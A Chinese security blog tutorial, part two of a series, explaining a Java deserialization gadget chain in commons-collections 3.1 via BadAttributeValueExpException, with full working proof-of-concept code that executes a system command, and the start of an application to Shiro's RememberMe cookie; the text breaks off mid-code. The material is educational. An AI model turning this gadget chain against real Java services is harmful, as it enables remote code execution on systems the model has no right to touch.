<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='声明
本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
新的希望
0x00
在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 commons-collections 3.1 搭配 sun.reflect.annotation.AnnotationInvocationHandler 实现远程命令执行的方式。但sun.reflect.annotation.AnnotationInvocationHandler 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类  javax.management.BadAttributeValueExpException 出现在了安全人员的视野。
javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。因此 javax.management.BadAttributeValueExpException 符合了 可序列化 这个要求，同样的它也增加了 readObject 方法，这个类的完整代码如下：
package javax.management;

import java.io.IOException;
import java.io.ObjectInputStream;


/**
 * Thrown when an invalid MBean attribute is passed to a query
 * constructing method.  This exception is used internally by JMX
 * during the evaluation of a query.  User code does not usually
 * see it.
 *
 * @since 1.5
 */
public class BadAttributeValueExpException extends Exception   {


    /* Serial version */
    private static final long serialVersionUID = -3105272988410493376L;

    /**
     * @serial A string representation of the attribute that originated this exception.
     * for example, the string value can be the return of {@code attribute.toString()}
     */
    private Object val;

    /**
     * Constructs a BadAttributeValueExpException using the specified Object to
     * create the toString() value.
     *
     * @param val the inappropriate value.
     */
    public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }


    /**
     * Returns the string representing the object.
     */
    public String toString()  {
        return "BadAttributeValueException: " + val;
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
 }
小伙伴们可能会很迷茫，这要何从下手？'><title>Java 反序列化漏洞原理（二）新版本JDK利用方式和Shiro举例</title><link rel="shortcut icon" type=image/x-icon href=/><link rel=stylesheet href=/css/main.0568d3f70e9896300444ff10565468b82c2dace6b1b82bc72fba6ae51bfb0849887e0eb4ccb3cdb1c915fbe68c7000fbea631be9322fd5d0bcab56732ce7293f.css integrity="sha512-BWjT9w6YljAERP8QVlRouCwtrOaxuCvHL7pq5Rv7CEmIfg60zLPNsckV++aMcAD76mMb6TIv1dC8q1ZzLOcpPw=="></head><body a=auto><main class=page-content aria-label=Content><div class=w><div class=post-meta><a href=/>..</a><p><time datetime="2021-10-16 22:55:00 +0800 +0800">2021-10-16</time></p></div><article><h1>Java 反序列化漏洞原理（二）新版本JDK利用方式和Shiro举例</h1><h2 id=声明>声明</h2><p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。</p><h2 id=新的希望>新的希望</h2><h3 id=0x00>0x00</h3><p>在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 <code>commons-collections 3.1</code> 搭配 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 实现远程命令执行的方式。但<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 <code>javax.management.BadAttributeValueExpException</code> 出现在了安全人员的视野。</p><p><code>javax.management.BadAttributeValueExpException</code> 继承自 <code>java.lang.Exception</code>，<code>java.lang.Exception</code> 继承自 <code>java.lang.Throwable</code>，而 <code>java.lang.Throwable</code> 实现了 <code>java.io.Serializable</code>。因此 <code>javax.management.BadAttributeValueExpException</code> 符合了 <strong>可序列化</strong> 这个要求，同样的它也增加了 <code>readObject</code> 方法，这个类的完整代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> javax.management;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.IOException;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectInputStream;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>/**
</span></span></span><span style=display:flex><span><span style=color:#6272a4> * Thrown when an invalid MBean attribute is passed to a query
</span></span></span><span style=display:flex><span><span style=color:#6272a4> * constructing method.  This exception is used internally by JMX
</span></span></span><span style=display:flex><span><span style=color:#6272a4> * during the evaluation of a query.  User code does not usually
</span></span></span><span style=display:flex><span><span style=color:#6272a4> * see it.
</span></span></span><span style=display:flex><span><span style=color:#6272a4> *
</span></span></span><span style=display:flex><span><span style=color:#6272a4> * @since 1.5
</span></span></span><span style=display:flex><span><span style=color:#6272a4> */</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>BadAttributeValueExpException</span> <span style=color:#8be9fd;font-style:italic>extends</span> Exception   {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/* Serial version */</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>final</span> <span style=color:#8be9fd>long</span> serialVersionUID <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>-</span>3105272988410493376L;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/**
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * @serial A string representation of the attribute that originated this exception.
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * for example, the string value can be the return of {@code attribute.toString()}
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> Object val;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/**
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * Constructs a BadAttributeValueExpException using the specified Object to
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * create the toString() value.
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     *
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * @param val the inappropriate value.
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#50fa7b>BadAttributeValueExpException</span> (Object val) {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>val</span> <span style=color:#ff79c6>=</span> val <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>?</span> <span style=color:#ff79c6>null</span> : val.<span style=color:#50fa7b>toString</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/**
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * Returns the string representing the object.
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> String <span style=color:#50fa7b>toString</span>()  {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;BadAttributeValueException: &#34;</span> <span style=color:#ff79c6>+</span> val;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>readObject</span>(ObjectInputStream ois) <span style=color:#8be9fd;font-style:italic>throws</span> IOException, ClassNotFoundException {
</span></span><span style=display:flex><span>        ObjectInputStream.<span style=color:#50fa7b>GetField</span> gf <span style=color:#ff79c6>=</span> ois.<span style=color:#50fa7b>readFields</span>();
</span></span><span style=display:flex><span>        Object valObj <span style=color:#ff79c6>=</span> gf.<span style=color:#50fa7b>get</span>(<span style=color:#f1fa8c>&#34;val&#34;</span>, <span style=color:#ff79c6>null</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (valObj <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span>) {
</span></span><span style=display:flex><span>            val <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span>;
</span></span><span style=display:flex><span>        } <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> (valObj <span style=color:#ff79c6>instanceof</span> String) {
</span></span><span style=display:flex><span>            val<span style=color:#ff79c6>=</span> valObj;
</span></span><span style=display:flex><span>        } <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> (System.<span style=color:#50fa7b>getSecurityManager</span>() <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Long
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Integer
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Float
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Double
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Byte
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Short
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Boolean) {
</span></span><span style=display:flex><span>            val <span style=color:#ff79c6>=</span> valObj.<span style=color:#50fa7b>toString</span>();
</span></span><span style=display:flex><span>        } <span style=color:#ff79c6>else</span> { <span style=color:#6272a4>// the serialized object is from a version without JDK-8019292 fix</span>
</span></span><span style=display:flex><span>            val <span style=color:#ff79c6>=</span> System.<span style=color:#50fa7b>identityHashCode</span>(valObj) <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;@&#34;</span> <span style=color:#ff79c6>+</span> valObj.<span style=color:#50fa7b>getClass</span>().<span style=color:#50fa7b>getName</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span> }
</span></span></code></pre></div><p>小伙伴们可能会很迷茫，这要何从下手？</p><p>别着急，我来一点点的分析。</p><p>首先我们来看这个方法的第一行代码 <code>ObjectInputStream.GetField gf = ois.readFields();</code>，它的意思是从已经序列化成字节数组的信息中获取 <strong>序列化前的类</strong> 的全部成员变量。</p><p>第二行代码 <code>Object valObj = gf.get("val", null);</code> 的意思是获取名词为 <code>val</code> 的成员变量，如果获取不到就返回 <code>null</code>。</p><p>接下来前两个的 <code>if</code> 判断很简单，就不解释了。</p><p>第三个 <code>if</code> 判断中只要 <code>System.getSecurityManager()</code> 是空值或者 <code>valObj</code> 是基本数据包装类型就调用 <code>toString()</code> 方法转换为字符串。</p><p><strong>问题就出在这个 <code>toString()</code> 上。</strong></p><h3 id=0x01>0x01</h3><p>安全人员在审查 <code>commons-collections 3.1</code> 的源码时发现 <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 的 <code>toString()</code> 方法如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> String <span style=color:#50fa7b>toString</span>() {
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> getKey() <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;=&#34;</span> <span style=color:#ff79c6>+</span> getValue();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>getKey()</code> 和 <code>getValue()</code> 代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>TiedMapEntry</span> <span style=color:#8be9fd;font-style:italic>implements</span> Map.<span style=color:#50fa7b>Entry</span>, KeyValue, Serializable {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/** Serialization version */</span>    
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>final</span> <span style=color:#8be9fd>long</span> serialVersionUID <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>-</span>8453869361373831205L;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/** The map underlying the entry/iterator */</span>    
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd;font-style:italic>final</span> Map map;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/** The key */</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd;font-style:italic>final</span> Object key;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/**
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * Constructs a new entry with the given Map and key.
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     *
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * @param map  the map
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * @param key  the key
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#50fa7b>TiedMapEntry</span>(Map map, Object key) {
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>super</span>();
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>map</span> <span style=color:#ff79c6>=</span> map;
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>this</span>.<span style=color:#50fa7b>key</span> <span style=color:#ff79c6>=</span> key;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// Map.Entry interface</span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>//-------------------------------------------------------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/**
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * Gets the key of this entry
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * 
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * @return the key
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>getKey</span>() {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> key;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>/**
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * Gets the value of this entry direct from the map.
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * 
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     * @return the value
</span></span></span><span style=display:flex><span><span style=color:#6272a4>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>getValue</span>() {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> map.<span style=color:#50fa7b>get</span>(key);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    代码省略...   
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>getKey()</code> 直接返回了字符串，不用考虑了。</p><p><code>getValue()</code> 是从构造方法传入的 <code>map</code> 中根据 传入的<code>key</code> 获取值。那么有没有一个 <code>Map</code> 的 <code>get</code> 方法可以调用 <code>org.apache.commons.collections.Transformer</code> 的 <code>transform</code> 方法呢？答案是有的，而且它还是 <code>commons-collections 3.1</code> 中的一个类。</p><h3 id=0x02>0x02</h3><p><code>org.apache.commons.collections.map.LazyMap</code> 顾名思义是一个懒加载的 <code>Map</code>，它继承自 <code>AbstractMapDecorator</code>,并且实现了 <code>Map</code> 和 <code>Serializable</code>接口。 它的构造方法有两个参数，一个是 <code>java.util.Map</code>，一个是<code>org.apache.commons.collections.Transformer</code>。它重写了<code>Map</code>的 <code>get</code> 方法，先判断构造方法传入的 <code>map</code> 中是否包含 <code>key</code>，不包含时会调用 <code>transformer</code> 的 <code>transform</code> 的方法进行转换，并进行后续的赋值和返回，代码如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>get</span>(Object key) {
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// create value for key if key is not currently in the map</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (map.<span style=color:#50fa7b>containsKey</span>(key) <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>false</span>) {
</span></span><span style=display:flex><span>        Object value <span style=color:#ff79c6>=</span> factory.<span style=color:#50fa7b>transform</span>(key);
</span></span><span style=display:flex><span>        map.<span style=color:#50fa7b>put</span>(key, value);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> value;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> map.<span style=color:#50fa7b>get</span>(key);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=绝地归来>绝地归来</h2><p>经过上述步骤的分析，我们得到了一个调用链。</p><pre tabindex=0><code>                           ,--------------------.   ,------------.           
                           |LazyMap             |   |TiedMapEntry|           
,-----------------------.  |--------------------|   |------------|           
|Transformer            |  |Map map;            |   |Map map;    |           
|-----------------------|--|Transformer factory;|---|String key; |           
|transform(Object input)|  |                    |   |            |           
`-----------------------&#39;  |get(String key);    |   |toString(); |           
                           `--------------------&#39;   `------------&#39;           
                                                           |                 
                                                           |                 
                                         ,----------------------------------.
                                         |BadAttributeValueExpException     |
                                         |----------------------------------|
                                         |TiedMapEntry val;                 |
                                         |readObject(ObjectInputStream ois);|
                                         `----------------------------------&#39;
</code></pre><p>下面我们来实际测试一下。</p><p>为简化代码，我们把序列化和反序列化代码做成工具类使用。</p><pre tabindex=0><code>import java.io.*;

/**
 * 序列化工具
 */
public class Serializer {

    /**
     * 将对象序列化为字节数组
     * @param obj 对象
     * @return 字节数组
     * @throws IOException IO异常
     */
    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (ObjectOutputStream objOut = new ObjectOutputStream(out)) {
            objOut.writeObject(obj);
            objOut.flush();
        }
        return out.toByteArray();
    }

    /**
     * 将字节数组反序列化对象
     * @param bytes 字节数组
     * @return 对象
     * @throws IOException IO异常
     * @throws ClassNotFoundException 类找不到异常
     */
    public static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            return input.readObject();
        }
    }
}
</code></pre><p>修改之前的测试代码。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>import</span> cn.typesafe.jsv.util.Serializer;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.Transformer;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ChainedTransformer;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.map.LazyMap;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javax.management.BadAttributeValueExpException;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Field;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.nio.charset.StandardCharsets;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.Base64;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.HashMap;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.Map;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>Exp4</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span>(String<span style=color:#ff79c6>[]</span> args) <span style=color:#8be9fd;font-style:italic>throws</span> Exception {
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> transformers <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]</span>{
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer(Runtime.<span style=color:#50fa7b>class</span>),
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer(<span style=color:#f1fa8c>&#34;getMethod&#34;</span>, <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]</span>{String.<span style=color:#50fa7b>class</span>, Class<span style=color:#ff79c6>[]</span>.<span style=color:#50fa7b>class</span>}, <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]</span>{<span style=color:#f1fa8c>&#34;getRuntime&#34;</span>, <span style=color:#ff79c6>null</span>}),
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer(<span style=color:#f1fa8c>&#34;invoke&#34;</span>, <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]</span>{Object.<span style=color:#50fa7b>class</span>, Object<span style=color:#ff79c6>[]</span>.<span style=color:#50fa7b>class</span>}, <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[</span>2<span style=color:#ff79c6>]</span>),
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer(<span style=color:#f1fa8c>&#34;exec&#34;</span>, <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]</span>{String.<span style=color:#50fa7b>class</span>}, <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]</span>{<span style=color:#f1fa8c>&#34;calc&#34;</span>})
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>        Transformer transformerChain <span style=color:#ff79c6>=</span> ChainedTransformer.<span style=color:#50fa7b>getInstance</span>(transformers);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 在调用 get 方法时传入一个不存在的 key 时会调用 Transformer 的 transform 方法</span>
</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#ff79c6>=</span> LazyMap.<span style=color:#50fa7b>decorate</span>(<span style=color:#ff79c6>new</span> HashMap(), transformerChain);
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 在调用 toString 方法时会自动调用 getValue 方法并使用 构造方法传入的 key 当作 key</span>
</span></span><span style=display:flex><span>        TiedMapEntry entry <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TiedMapEntry(lazyMap, <span style=color:#f1fa8c>&#34;守法市民小杜&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 创建BadAttributeValueExpException对象，类型是 public 的，无需使用反射创建</span>
</span></span><span style=display:flex><span>        BadAttributeValueExpException obj <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> BadAttributeValueExpException(<span style=color:#ff79c6>null</span>);
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 成员 val 没有setVal 方法，只能通过反射修改</span>
</span></span><span style=display:flex><span>        Field valField <span style=color:#ff79c6>=</span> obj.<span style=color:#50fa7b>getClass</span>().<span style=color:#50fa7b>getDeclaredField</span>(<span style=color:#f1fa8c>&#34;val&#34;</span>);
</span></span><span style=display:flex><span>        valField.<span style=color:#50fa7b>setAccessible</span>(<span style=color:#ff79c6>true</span>);
</span></span><span style=display:flex><span>        valField.<span style=color:#50fa7b>set</span>(obj, entry);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>/*-----------------------以下是序列化和反序列化测试----------------------------*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 将用户序列化为字节数组，将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化</span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>final</span> String data <span style=color:#ff79c6>=</span> Base64.<span style=color:#50fa7b>getEncoder</span>().<span style=color:#50fa7b>encodeToString</span>(Serializer.<span style=color:#50fa7b>serialize</span>(obj));
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;序列化后：&#34;</span> <span style=color:#ff79c6>+</span> data);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 将base64编码的数据再解码为字节数组</span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>final</span> Object o <span style=color:#ff79c6>=</span> Serializer.<span style=color:#50fa7b>deserialize</span>(Base64.<span style=color:#50fa7b>getDecoder</span>().<span style=color:#50fa7b>decode</span>(data.<span style=color:#50fa7b>getBytes</span>(StandardCharsets.<span style=color:#50fa7b>UTF_8</span>)));
</span></span><span style=display:flex><span>        System.<span style=color:#50fa7b>out</span>.<span style=color:#50fa7b>println</span>(<span style=color:#f1fa8c>&#34;反序列化：&#34;</span><span style=color:#ff79c6>+</span>o);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>在最新版 <code>jdk 1.8.0_301</code> 上测试通过，弹出了计算器。</p><h2 id=西斯的复仇>西斯的复仇</h2><h3 id=0x00-1>0x00</h3><p>有杠精附体的朋友说我上节写的那个接口在现实环境中基本上不会有，那我们今天来介绍一个使用广泛的框架 <code>shiro</code>。</p><p><code>shiro</code> 的 <strong>RememberMe</strong> 功能就是利用了 Java 的反序列化来实现的，不过它并不是直接将对象序列化成数组后简单使用 base64 编码就写入到 Cookie 中，而是将对象字节数组进行了一次 <strong>AES</strong> 加密，最后才 base64 编码写入到 Cookie 中。</p><p>以最新版 <code>shiro 1.8.0</code> 为例， <code>org.apache.shiro.mgt.AbstractRememberMeManager</code> 的 <code>onSuccessfulLogin</code> 方法中，当打开 <strong>RememberMe</strong> 后会调用 <code>rememberIdentity</code> 方法</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>onSuccessfulLogin</span>(Subject subject, AuthenticationToken token, AuthenticationInfo info) {
</span></span><span style=display:flex><span>    <span style=color:#6272a4>//always clear any previous identity:</span>
</span></span><span style=display:flex><span>    forgetIdentity(subject);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>//now save the new identity:</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (isRememberMe(token)) {
</span></span><span style=display:flex><span>        rememberIdentity(subject, token, info);
</span></span><span style=display:flex><span>    } <span style=color:#ff79c6>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (log.<span style=color:#50fa7b>isDebugEnabled</span>()) {
</span></span><span style=display:flex><span>            log.<span style=color:#50fa7b>debug</span>(<span style=color:#f1fa8c>&#34;AuthenticationToken did not indicate RememberMe is requested.  &#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                    <span style=color:#f1fa8c>&#34;RememberMe functionality will not be executed for corresponding account.&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>rememberIdentity</code> 方法如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>rememberIdentity</span>(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 生成身份认证信息</span>
